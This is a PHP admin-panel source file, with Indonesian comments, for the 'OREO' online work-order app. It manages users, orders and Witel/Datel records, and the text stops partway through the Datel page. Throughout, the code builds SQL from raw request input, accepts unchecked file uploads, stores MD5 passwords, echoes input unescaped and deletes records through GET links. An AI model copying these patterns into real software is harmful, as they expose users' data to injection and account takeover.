
<?php
include('../dbconfig.php');
session_start(); //memulai session
if( !isset($_SESSION['nama_u']) ) //jika session nama tidak ada
{
 header('location:./../'.$_SESSION['akses']); //alihkan halaman
 exit();
}else{ //jika ada session
 $nama = $_SESSION['nama_u']; //menyimpan session nama ke variabel $nama
 $query = mysqli_query($db,"SELECT * FROM tb_user WHERE username='$nama' ");
}

?>
<!-- site head -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
  <title>OREO-Aplikasi Order Perintah Kerja Online</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-touch-fullscreen" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <meta content="" name="description" />
  <meta content="" name="author" /> 
  <link rel="shortcut icon" type="image/png" href="../img/favicon.png"/>
  <link href="../css/vendor.min.css" rel="stylesheet" type="text/css" media="all" />
  <link href="../css/main.css" rel="stylesheet" type="text/css" media="all" />
  <link href="../css/color-settings.css" rel="stylesheet" type="text/css" media="all" data-role="color-settings"/>
</head>
<body class="nav-md theme-green">
  <!-- /site head -->
  <div class="main-container">
    <!-- sidebar -->
    <div class="sidebar">
      <div class="scroll-wrapper">
        <div class="navbar nav-title">

        </div>
        <div class="nav toggle">
          <a href="javascript:void(0)" id="sidebar-menu-toggle" class="btn btn-circle ripple">
            <i class="fa fa-times"></i>
          </a>
        </div>
        <div class="clearfix"></div>

        <!-- menu profile quick info -->
        <div class="profile clearfix">
          <div class="profile-pic">
            <?php
              $a = mysqli_query($db,"SELECT * FROM tb_user WHERE nama='$nama'");
              while($aa=mysqli_fetch_array($a)){
                echo "<img src='../img/$aa[foto]' alt='Profile picture' class='rounded-circle profile-img'>";
              }

            ?>
          </div>
          <div class="profile-info">
            <h2><?php echo $nama;?></h2>


          </div>
        </div>
        <!-- /menu profile quick info -->



        <!-- sidebar menu -->
 		<div id="sidebar-menu" class="main-menu-wrapper">
                    <div class="menu-section">
                        <ul class="nav side-menu flex-column">
                            <li class="nav-item">
                                <a href="index.php?page=administrator" title="Dashboard">
                                    <i class="fa fa-home" aria-hidden="true"></i>
                                    <span>Dashboard</span>
                                </a>
                            </li>
                           	<li class="nav-item">
                                <a href="index.php?page=lihat_data_user" class="ripple" title="UI Elements">
                                    <i class="fa fa-user" aria-hidden="true"></i>
                                    <span>Data User</span>
                                </a>
                            </li>

                            <li class="nav-item has-child">
                                <a href="javascript:void(0);" class="ripple" title="Tables">
                                    <i class="fa fa-archive" aria-hidden="true"></i>
                                    <span>Data Order</span>
                                    <span class="fa fa-chevron-right" aria-hidden="true"></span>
                                </a>
                                <ul class="nav child-menu">
                                    <li class="child-menu-title">Data Order</li>
                                    <li><a href="index.php?page=lihat_data_order">Lihat Daftar Order</a></li>
                                    <li><a href="index.php?page=cetak_data_order">Report</a></li>
                                </ul>
                            </li>

                            <li class="nav-item has-child">
                                <a href="javascript:void(0);" class="ripple" title="Extras">
                                    <i class="fa fa-building" aria-hidden="true"></i>
                                    <span>Data Perusahaan</span>
                                    <span class="fa fa-chevron-right"></span>
                                </a>
                                <ul class="nav child-menu">
                                    <li class="child-menu-title">Data Perusahaan</li>
                                    <li class="has-child">
                                        <a href="index.php?page=lihat_data_witel">
                                            <span>Data Witel</span>
                                            <span class="fa fa-chevron-right"></span>
                                        </a>
                                    </li>
                                    <li class="has-child">
                                        <a href="index.php?page=lihat_data_datel">
                                            <span>Data Datel</span>
                                            <span class="fa fa-chevron-right"></span>
                                        </a>
                                    </li>
                                    <li class="has-child">
                                        <a href="index.php?page=lihat_data_sto">
                                            <span>Data STO</span>
                                            <span class="fa fa-chevron-right"></span>
                                        </a>
                                    </li>
                                </ul>
                            </li>
                            <li class="nav-item">
                                <a href="documentation.html" title="Documentation">
                                    <i class="fa fa-file-text" aria-hidden="true"></i>
                                    <span>Cetak Laporan</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
        <!-- /sidebar menu -->
      </div>
    </div>
    <!-- /sidebar -->
    <div class="content-wrapper">
      <!-- header content  -->
      <header class="header">
        <nav class="header-menu">
          <div class="nav toggle">
            <a href="javascript:void(0)" id="menu-toggle" class="ripple">
              <span class="bars"></span>
            </a>
          </div>
          <ul class="nav navbar-nav navbar-right">


            <li class="profile-dropdown dropdown">
              <a href="javascript:void(0)" class="user-profile dropdown-toggle ripple" data-toggle="dropdown" aria-expanded="false">
                <span class="d-none d-sm-block"> <h2><?php echo $nama; ?></h2></span>
                <span class="fa fa-angle-down"></span>
              </a>
              <ul class="dropdown-menu float-right">
                <li class="d-none d-block-xs p-0">
                  <button type="button" class="close btn btn-circle"><i class="fa fa-close"></i></button>
                  <div class="profile clearfix">
                    <div class="profile-pic">


                      <?php
                      while($data_users=mysqli_fetch_array($query)){
                        ?>
                        <img src="../img/<?php echo $data_users['foto']?>" class="rounded-circle profile-img">

                        <?php
                      }
                      ?>

                    </div>
                    <div class="profile-info">
                      <h2> <h2>
                        <?php
                        $c = mysqli_query($db,"SELECT * FROM tb_user WHERE nama='$nama'");
                        while ($r=mysqli_fetch_array($c)) {
                            echo $r["foto"];
                        }
                       // echo $nama;
                        ?>

                       </h2></h2>
                    </div>
                  </div>
                </li>
                <li><a href="index.php?page=dashboard"><i class="fa fa-user-o" aria-hidden="true"></i>Profile</a></li>
                <li><a href="../logout.php"><i class="fa fa-sign-out" aria-hidden="true"></i> Logout</a></li>
              </ul>
            </li>
          </ul>
        </nav>
      </header>
      <!-- /header content -->
      <?php
      switch ($_GET['page']) {
        // START HALAMAN DASHBOARD
        case 'dashboard':
        // code...
        ?>
        <!-- page content -->
        <div class="main-content small-gutter">
          <!-- START PAGE COVER -->
          <div class="row bg-title clearfix page-title">
            <div class="col-12 col-lg-3">
              <h4 class="page-title">Selamat datang,<b> <?php echo $nama; ?></b></h4>
            </div>
            <div class="col-12 col-lg-9">
              <!-- START breadcrumb -->
              <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                <li><a href="index-2.html">Oreo</a></li>
                <li><a href="javascript:void(0)">Teknisi</a></li>
                <li class="active">Dashboard</li>
              </ol>
              <!-- END breadcrumb -->
            </div>
            <div class="col-12">
              <h3>General elements</h3>
            </div>
          </div>
          <!-- END PAGE COVER -->

          <div class="container-fluid">
            <div class="row">
              <div class="col-lg-12 col-xl-6 mb-2">
                INI DASHBOARD
            </div>
            </div>
          </div>
        </div>
        <!-- /page content -->
        <?php
        break;
        // END HALAMAN DASHBOARD

		//START HALAMAN LIHAT DATA USER
		case "lihat_data_user":
    ?>
    <?php
		// Langkah 1. Tentukan batas,cek halaman & posisi data
		$batas   = 10;
		$halaman = @$_GET['halaman'];
		if(empty($halaman)){
		 $posisi  = 0;
		 $halaman = 1;
		}
		else{
		  $posisi  = ($halaman-1) * $batas;
		}

    ?>
		<!-- UNTUK MODAL INPUTAN -->
		<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
		                                    <div class="modal-dialog" role="document">
		                                        <div class="modal-content">
		                                            <form action='index.php?page=proses_tambah_user' method="POST" enctype="multipart/form-data">
		                                            <div class="modal-header">
		                                                <h5 class="modal-title" id="exampleModalLabel">TAMBAH USER BARU</h5>
		                                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
		                                                    <span aria-hidden="true">&times;</span>
		                                                </button>
		                                            </div>
		                                            <div class="modal-body">

		                                                    <div class="form-group">
		                                                        <label for="recipient-name" class="form-control-label">
		                                                        NIP
		                                                    	</label>
		                                                        <input type="number" class="form-control" name="nip">
		                                                    </div>
		                                                    <div class="form-group">
		                                                        <label for="message-text" class="form-control-label">
		                                                        NAMA
		                                                    	</label>
		                                                        <input type="text" class="form-control" name="nama">
		                                                    </div>
		                                                    <div class="form-group">
		                                                        <label for="message-text" class="form-control-label">
		                                                        USERNAME
		                                                    	</label>
		                                                        <input type="text" class="form-control" name="username">
		                                                    </div>
		                                                    <div class="form-group">
		                                                        <label for="message-text" class="form-control-label">
		                                                        PASSWORD
		                                                    	</label>
		                                                        <input type="password" class="form-control" name="password">
		                                                    </div>
		                                                    <div class="form-group">
		                                                        <label for="message-text" class="form-control-label">
		                                                        LEVEL
		                                                    	</label>
		                                                        <select class="custom-select" id="exampleFormCustomSelectPref" name="level">
						                                            <option selected="">Pilih level</option>
						                                            <option value="teknisi">teknisi</option>
						                                            <option value="admin">admin</option>
						                                            <option value="organik">organik</option>
						                                            <option value="manager">manager</option>
						                                        </select>
		                                                    </div>
		                                                    <div class="form-group">
		                                                        <label for="message-text" class="form-control-label">
		                                                        FOTO
		                                                    	</label>
		                                                        <input type="file" class="form-control" name="foto">
		                                                    </div>
		                                                    <div class="form-group">
		                                                        <label for="message-text" class="form-control-label">
		                                                        FOTO TANDA TANGAN
		                                                    	</label>
		                                                        <input type="file" class="form-control" name="foto_ttd">
		                                                    </div>

		                                            </div>
		                                            <div class="modal-footer">
		                                                <input type="reset" class="btn btn-secondary" data-dismiss="modal" value='Batal'></button>
		                                                <input type="submit" class="btn btn-theme" value='Tambah User' name='bt_tambah_user'></button>
		                                            </div>
		                                        	</form>
		                                        </div>
		                                    </div>
		                                </div>
		<!-- END MODAL INPUTAN -->

		<div class="bg-white padding-25 h-100">
                                <h4 class="mt-0 box-title">Data User</h4>
                                <div class="data-table-wrapper">
                                    <div class="row">
                                        <div class="col-sm-12 col-lg-4 col-xl-6">
                                            <div class="data-table-length">
                                            </div>
                                        </div>

                                        <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">

                                            <div class="actions ml-md-3 mb-2 text-sm-right d-lg-inline-block">
                                            	<!-- <button type="button" class="btn btn-outline-primary width-100-xs" data-toggle="modal" data-target="#exampleModal" data-whatever="@fat">Open modal for @fat</button> -->

                                                <button type="button" class="btn btn-circle btn-primary" data-toggle="modal" data-target="#exampleModal" data-whatever="@fat"><i class="fa fa-plus"></i></button> Tambah User Baru
                                                <button type="button" class="btn btn-warning btn-circle">
                                                    <i class="fa fa-print"></i>
                                                </button> Cetak Data User

                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="table-responsive">
                                                <table id="example1" class="table table-striped table-bordered data-table mb-0" role="grid">
                                                    <thead>
                                                    <tr>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" class="text-center">
                                                            NIP
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Name: activate to sort column descending">
                                                            NAMA
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Position: activate to sort column ascending">
                                                        	USERNAME
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Email: activate to sort column ascending">
                                                            LEVEL
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Start date: activate to sort column ascending">
                                                        	FOTO
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Status: activate to sort column ascending">
                                                            FOTO TTD
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Age: activate to sort column ascending">AKSI
                                                        </th>
                                                    </tr>
                                                    </thead>

                                                    <tbody>

													<?php
														// Langkah 2. Sesuaikan query dengan posisi dan batas
														$query  = "SELECT * FROM tb_user LIMIT $posisi,$batas";
														$tampil = mysqli_query($db, $query);
														$no = $posisi+1;
														while ($show_user=mysqli_fetch_array($tampil)){
													 	echo"

													          <tr>
													          	<td class='text-center'>
													                $show_user[nip]
													            </td>
													            <td>$show_user[nama]</td>
													            <td>$show_user[username]</td>
													            <td>$show_user[level]</td>
													            <td><img src='../img/$show_user[foto]' /></td>
													            <td><img src='../lampiran/$show_user[foto_ttd]' /></td>
													            <td><a href='index.php?page=lihat_data_user&nip=$show_user[nip]' class='text-danger text-nowrap remove' title='Delete'><i class='fa fa-trash-o' ></i>Delete</a>
													            </td>
													          </tr>";

														  $no++;
														}

													?>

													<?php
												        if(isset($_GET['nip']))
														{

															$nip = $_GET["nip"];
															$i = mysqli_query($db, "SELECT * FROM tb_user WHERE nip ='$nip' ");

															$u =mysqli_fetch_array($i);

															if(is_file("../img/".$u['foto'])) unlink("../img/".$u['foto']);
															mysqli_query($db, "DELETE FROM tb_user WHERE nip='$nip' ");


														     ?>
														     <div class="alert alert-danger mb-2" role="alert">
                                   							Data user dengan nip <b> <?php echo $_GET['nip']; ?></b> berhasil dihapus.
                                							</div>
														     <meta http-equiv="refresh" content="0.3; url=index.php?page=lihat_data_user">
														     <?php
														}
													?>
													</tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12 col-md-5">
                                            <div class="showing-items">
                                            </div>
                                        </div>
<?php
// Langkah 3: Hitung total data dan halaman serta link 1,2,3
$query2     = mysqli_query($db, "select * from tb_user");
$jmldata    = mysqli_num_rows($query2);
$jmlhalaman = ceil($jmldata/$batas);

?>


                                        <div class="col-sm-12 col-md-7">
                                            <div class="data-table-paginate">
                                                <nav>
                                                    <ul class="pagination">

<?php

for($i=1;$i<=$jmlhalaman;$i++)
if ($i != $halaman){
 echo "  <li class='page-item'> <a href=\"index.php?page=lihat_data_user&halaman=$i\" class='page-link'>$i</a></li>";
}
else{
 echo " <li class='page-item'> <a class='page-link badge-danger' style='color:white;'>$i</a> </li>";
}

?>




                                                    </ul>
                                                </nav>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>



        <?php
        break;
        // END HALAMAN LIHAT DATA USER


        // START HALAMAN PROSES TAMBAH USER
		case "proses_tambah_user":

        include("../dbConfig.php");

        // cek apakah tombol daftar sudah diklik atau blum?
        if(isset($_POST['bt_tambah_user'])){

    		$nip = $_POST['nip'];
    		$nama = $_POST['nama'];
    		$username = $_POST['username'];
    		$password = md5(($_POST['password']));
    		$level = $_POST['level'];

	      $file_name = $_FILES['foto']['name'];
	      $tmp_name = $_FILES['foto']['tmp_name'];
	      move_uploaded_file($tmp_name, "../img/".$file_name);
	      $ft_user= $file_name;




        // Proses insert data dari form ke db
        $sql_user = "INSERT INTO tb_user(nip,nama,username,password,level,foto) VALUES ('$nip','$nama','$username','$password','$level','$ft_user')";


	        if(mysqli_query($db, $sql_user))
	        {
	          echo "<script>alert('Tambah Data User baru Berhasil!');location.replace('index.php?page=lihat_data_user')</script>";
	        }else
          	{
            	echo "Error updating record: " . mysqli_error($db);
          	}



	}else {
			die("Akses dilarang...");
	  		header('location:../logout.php');
		}

		break;
// END HALAMAN LIHAT PROSES DATA USER

        // START HALAMAN LIHAT DATA ORDER
        case "lihat_data_order":
        ?>
        <?php
		// Langkah 1. Tentukan batas,cek halaman & posisi data
		$batas   = 10;
		$halaman = @$_GET['halaman'];
		if(empty($halaman)){
		 $posisi  = 0;
		 $halaman = 1;
		}
		else{
		  $posisi  = ($halaman-1) * $batas;
		}

        ?>

        <!-- page content -->
            <div class="main-content">
                <!-- START PAGE COVER -->
                <div class="row bg-title clearfix page-title">
                    <div class="col-12 col-lg-3">
                        <h4 class="page-title">Getting started!</h4>
                    </div>
                    <div class="col-12 col-lg-9">
                        <!-- START breadcrumb -->
                        <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                            <li><a href="index-2.html">Oreo</a></li>
                            <li><a href="javascript:void(0)">Teknisi</a></li>
                            <li class="active">In Progress Order</li>
                        </ol>
                        <!-- END breadcrumb -->
                    </div>
                    <div class="col-12">
                       <h3>Daftar In Progress Order</h3>
                    </div>
                </div>
                <!-- END PAGE COVER -->
                <div class="container-fluid">
                    <div class="row">

                        <div class="col-lg-12 col-xl-12 mb-2">
                            <div class="bg-white padding-25 h-100">
                                  <div class="data-table-wrapper">
                                    <div class="row">
                                        <div class="col-sm-12 col-lg-4 col-xl-6">
                                        </div>

                                        <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">
                                            <div class="data-table-filter mb-2 float-sm-left float-lg-none d-lg-inline-block">
                                                <label for="search1">Cari Berkas Order:</label>
                                                <input type="search" class="form-control" id="search1" placeholder="masukkan No Tiket">
                                            </div>

                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="table-responsive">
                                                <table id="example2" class="table table-striped table-bordered data-table table-checkable mb-0" role="grid">
                                                    <thead>
                                                    <tr>
                                                       <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending">
                                                            No
                                                        </th>

                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            No Tiket
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Tanggal Buat
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Nama Pekerjaan
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Lokasi
                                                        </th>

                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            STO
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Penyebab
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1"
                                                            colspan="1"
                                                            aria-label="Id: activate to sort column descending"
                                                            class="text-center">
                                                            Status
                                                        </th>

                                                    </tr>
                                                    </thead>
                                                    <tbody>

													<?php
														// Langkah 2. Sesuaikan query dengan posisi dan batas
														$query = "
												        SELECT tb_order.id,tb_order.namapekerjaan,tb_order.notiket,tb_order.lokasi,tb_order.kd_witel,tb_order.kd_sto,tb_order.penyebab,tb_order.lampiran, tb_witel.witel, tb_tiket.tanggal_buat,tb_tiket.status
												        FROM ((tb_order
												        INNER JOIN tb_witel ON tb_order.kd_witel = tb_witel.kd_witel)
												        INNER JOIN tb_tiket ON tb_order.notiket = tb_tiket.notiket)
												        ORDER BY tb_tiket.notiket DESC
												        LIMIT $posisi,$batas
												        ";

														$res = mysqli_query($db, $query);
														$no = $posisi+1;
														$nomor =1;
														while ($nomor <= ($data=mysqli_fetch_array($res))){
													?>
													<tr>
                                                        <td class="text-center"><?php echo $nomor; ?></td>
                                                        <td class="text-center"><?php echo $data["notiket"]; ?></td>
                                                        <td><?php echo $data["tanggal_buat"]; ?></td>
                                                        <td><?php echo $data["namapekerjaan"]; ?></td>
                                                        <td><?php echo $data["lokasi"]; ?></td>

                                                        <td class="text-center"><?php echo $data["kd_sto"]; ?></td>
                                                        <td><?php echo $data["penyebab"]; ?></td>

                                                         <td class="text-center">
                                                          <?php
                                                              if($data["status"]==1){
                                                                  echo '<span class="badge badge-pill badge-info text-uppercase">Completed</span>';
                                                              }else{
                                                                echo '<span class="badge badge-pill badge-danger text-uppercase">Progress</span>';

                                                              }
                                                          ?>
                                                         </td>
                                                    </tr>


													<?php

														  $nomor++;
														  $no++;
														}
													?>





                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                   	<div class="row">
                                        <div class="col-sm-12 col-md-5">
                                            <div class="showing-items">
                                            </div>
                                        </div>
											<?php
											// Langkah 3: Hitung total data dan halaman serta link 1,2,3
											$query2     = mysqli_query($db, "select * from tb_user");
											$jmldata    = mysqli_num_rows($query2);
											$jmlhalaman = ceil($jmldata/$batas);

											?>


											                                        <div class="col-sm-12 col-md-7">
											                                            <div class="data-table-paginate">
											                                                <nav>
											                                                    <ul class="pagination">

											<?php

											for($i=1;$i<=$jmlhalaman;$i++)
											if ($i != $halaman){
											 echo "  <li class='page-item'> <a href=\"index.php?page=lihat_data_order&halaman=$i\" class='page-link'>$i</a></li>";
											}
											else{
											 echo " <li class='page-item'> <a class='page-link badge-danger' style='color:white;'>$i</a> </li>";
											}

											?>


                                                    </ul>
                                                </nav>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /page content -->

        <?php
        break;

        // END HALAMAN IN PROGRESS ORDER





		//START HALAMAN LIHAT DATA WITEL
		case "lihat_data_witel":
        ?>
        <?php
		// Langkah 1. Tentukan batas,cek halaman & posisi data
		$batas   = 5;
		$halaman = @$_GET['halaman'];
		if(empty($halaman)){
		 $posisi  = 0;
		 $halaman = 1;
		}
		else{
		  $posisi  = ($halaman-1) * $batas;
		}

        ?>
		<!-- UNTUK MODAL INPUTAN -->
		<div class="modal fade" id="exampleModalWitel" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
		                                    <div class="modal-dialog" role="document">
		                                        <div class="modal-content">
		                                            <form action='index.php?page=proses_tambah_witel' method="POST" >
		                                            <div class="modal-header">
		                                                <h5 class="modal-title" id="exampleModalLabel">TAMBAH WITEL BARU</h5>
		                                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
		                                                    <span aria-hidden="true">&times;</span>
		                                                </button>
		                                            </div>
		                                            <div class="modal-body">

		                                                    <div class="form-group">
		                                                        <label for="recipient-name" class="form-control-label">
		                                                        NAMA WITEL
		                                                    	</label>
		                                                        <input type="text" class="form-control" name="witel">
		                                                    </div>
		                                                    <div class="form-group">
		                                                        <label for="message-text" class="form-control-label">
		                                                        ALAMAT
		                                                    	</label>
		                                                        <input type="text" class="form-control" name="alamat">
		                                                    </div>

		                                                    <div class="form-group">
		                                                        <label for="message-text" class="form-control-label">
		                                                        REGIONAL
		                                                    	</label>
		                                                        <select class="custom-select" id="exampleFormCustomSelectPref" name="regional">
						                                            <option selected="">Pilih Regional</option>
						                                            <?php
                                                        $query_witel = mysqli_query($db,"SELECT * FROM tb_regional");
                                                        while($data_regional=mysqli_fetch_array($query_witel)){

                                                          echo"<option value='$data_regional[kd_regional]'>$data_regional[regional]</option>";

                                                        }


                                                        ?>
						                                        </select>
		                                                    </div>

		                                            </div>
		                                            <div class="modal-footer">
		                                                <input type="reset" class="btn btn-secondary" data-dismiss="modal" value='Batal'></button>
		                                                <input type="submit" class="btn btn-theme" value='Tambah Witel' name='bt_tambah_witel'></button>
		                                            </div>
		                                        	</form>
		                                        </div>
		                                    </div>
		                                </div>
		<!-- END MODAL INPUTAN -->

		<div class="bg-white padding-25 h-100">
                                <h4 class="mt-0 box-title">Data Witel</h4>
                                <div class="data-table-wrapper">
                                    <div class="row">
                                        <div class="col-sm-12 col-lg-4 col-xl-6">
                                            <div class="data-table-length">
                                            </div>
                                        </div>

                                        <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">

                                            <div class="actions ml-md-3 mb-2 text-sm-right d-lg-inline-block">
                                            	<!-- <button type="button" class="btn btn-outline-primary width-100-xs" data-toggle="modal" data-target="#exampleModal" data-whatever="@fat">Open modal for @fat</button> -->

                                                <button type="button" class="btn btn-circle btn-primary" data-toggle="modal" data-target="#exampleModalWitel" data-whatever="@fat"><i class="fa fa-plus"></i></button> Tambah Witel Baru


                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="table-responsive">
                                                <table id="example1" class="table table-striped table-bordered data-table mb-0" role="grid">
                                                    <thead>
                                                    <tr>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" class="text-center">
                                                           #ID
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Name: activate to sort column descending">
                                                            WITEL
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Position: activate to sort column ascending">
                                                        	REGIONAL
                                                        </th>
                                                        <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Email: activate to sort column ascending">
                                                            ALAMAT
                                                        </th>
                                                       <th tabindex="0" aria-controls="example" rowspan="1" colspan="1" aria-label="Email: activate to sort column ascending">
                                                            AKSI
                                                        </th>
                                                    </tr>
                                                    </thead>

                                                    <tbody>

													<?php
														// Langkah 2. Sesuaikan query dengan posisi dan batas
														$query  = "SELECT * FROM tb_witel LIMIT $posisi,$batas";
														$tampil = mysqli_query($db, $query);
														$no = $posisi+1;
														while ($show_witel=mysqli_fetch_array($tampil)){
													 	echo"

													          <tr>
													          	<td class='text-center'>
													                $show_witel[kd_witel]
													            </td>
													            <td>$show_witel[witel]</td>
													            <td>Regional $show_witel[kd_regional]</td>
													            <td>$show_witel[alamat]</td>

													            <td><a href='index.php?page=lihat_data_witel&kd_witel=$show_witel[kd_witel]' class='text-danger text-nowrap remove' title='Delete'><i class='fa fa-trash-o' ></i>Delete</a>
													            </td>
													          </tr>";

														  $no++;
														}

													?>

													<?php
												        if(isset($_GET['kd_witel']))
														{

															$kd_witel = $_GET["kd_witel"];


															mysqli_query($db, "DELETE FROM tb_witel WHERE kd_witel='$kd_witel' ");


														     ?>
														     <div class="alert alert-danger mb-2" role="alert">
                                   							Data witel dengan kd_witel <b> <?php echo $_GET['kd_witel']; ?></b> berhasil dihapus.
                                							</div>
														     <meta http-equiv="refresh" content="0.3; url=index.php?page=lihat_data_witel">
														     <?php
														}
													?>
													</tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12 col-md-5">
                                            <div class="showing-items">
                                            </div>
                                        </div>
<?php
// Langkah 3: Hitung total data dan halaman serta link 1,2,3
$query2     = mysqli_query($db, "select * from tb_witel");
$jmldata    = mysqli_num_rows($query2);
$jmlhalaman = ceil($jmldata/$batas);

?>


                                        <div class="col-sm-12 col-md-7">
                                            <div class="data-table-paginate">
                                                <nav>
                                                    <ul class="pagination">

<?php

for($i=1;$i<=$jmlhalaman;$i++)
if ($i != $halaman){
 echo "  <li class='page-item'> <a href=\"index.php?page=lihat_data_witel&halaman=$i\" class='page-link'>$i</a></li>";
}
else{
 echo " <li class='page-item'> <a class='page-link badge-danger' style='color:white;'>$i</a> </li>";
}

?>




                                                    </ul>
                                                </nav>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>



        <?php
        break;
        // END HALAMAN LIHAT DATA WITEL


        // START HALAMAN PROSES TAMBAH WITEL
		case "proses_tambah_witel":

        include("../dbConfig.php");

// cek apakah tombol daftar sudah diklik atau blum?
if(isset($_POST['bt_tambah_witel'])){


		$witel = $_POST['witel'];
		$alamat = $_POST['alamat'];
 		$regional = $_POST['regional'];





        // Proses insert data dari form ke db
        $sql_witel = "INSERT INTO tb_witel(witel,alamat,kd_regional) VALUES ('$witel','$alamat','$regional')";


	        if(mysqli_query($db, $sql_witel))
	        {
	          echo "<script>alert('Tambah Data Witel baru Berhasil!');location.replace('index.php?page=lihat_data_witel')</script>";
	        }else
          	{
            	echo "Error updating record: " . mysqli_error($db);
          	}



	}else {
			die("Akses dilarang...");
	  		header('location:../logout.php');
		}

		break;
// END HALAMAN TAMBAH WITEL







		//START HALAMAN LIHAT DATA DATEL
		case "lihat_data_datel":
        ?>
        <?php
		// Langkah 1. Tentukan batas,cek halaman & posisi data
		$batas   = 20;
		$halaman = @$_GET['halaman'];
		if(empty($halaman)){
		 $posisi  = 0;
		 $halaman = 1;
		}
		else{
		  $posisi  = ($halaman-1) * $batas;
		}

        ?>
		<!-- UNTUK MODAL INPUTAN -->
		<div class="modal fade" id="exampleModalDatel" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
		                                    <div class="modal-dialog" role="document">
		                                        <div class="modal-content">
		                                            <form action='index.php?page=proses_tambah_datel' method="POST" >
		                                            <div class="modal-header">
		                                                <h5 class="modal-title" id="exampleModalLabel">TAMBAH DATEL BARU</h5>
		                                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
		                                                    <span aria-hidden="true">&times;</span>
		                                                </button>
		                                            </div>
		                                            <div class="modal-body">

		                                                    <div class="form-group">
		                                                        <label for="recipient-name" class="form-control-label">
		                                                        NAMA DATEL
		                                                    	</label>
		                                                        <input type="text" class="form-control" name="datel">
		                                                    </div>

		                                                    <div class="form-group">
		                                                        <label for="message-text" class="form-control-label">
		                                                        WITEL
		                                                    	</label>
		                                                        <select class="custom-select" id="exampleFormCustomSelectPref" name="witel">
						                                            <option selected="">Pilih Witel</option>
						                                            <?php
                                                        $query_witel = mysqli_query($db,"SELECT * FROM tb_witel");
                                                        while($data_witel=mysqli_fetch_array($query_witel)){

                                                          echo"<option value='$data_witel[kd_witel]'>$data_witel[witel]</option>";

                                                        }


                                                        ?>
						                                                 </select>
		                                                    </div>

                                                        <div class="form-group">
                                                        		<label for="recipient-name" class="form-control-label">
                                                        		 ALAMAT DATEL
                                                        		</label>
                                                        		<input type="text" class="form-control" name="alamat">
                                                        </div>

		                                            </div>
		                                            <div class="modal-footer">
		                                                <input type="reset" class="btn btn-secondary" data-dismiss="modal" value='Batal'></button>
		                                                <input type="submit" class="btn btn-theme" value='Tambah Witel' name='bt_tambah_datel'></button>
		                                            </div>
		                                        	</form>
		                                        </div>
		                                    </div>
		                                </div>
		<!-- END MODAL INPUTAN -->

		<div class="bg-white padding-25 h-100">
                                <h4 class="mt-0 box-title">Data DATEL</h4>
                                <div class="data-table-wrapper">
                                    <div class="row">
                                        <div class="col-sm-12 col-lg-4 col-xl-6">
                                            <div class="data-table-length">
                                            </div>
                                        </div>

                                        <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">

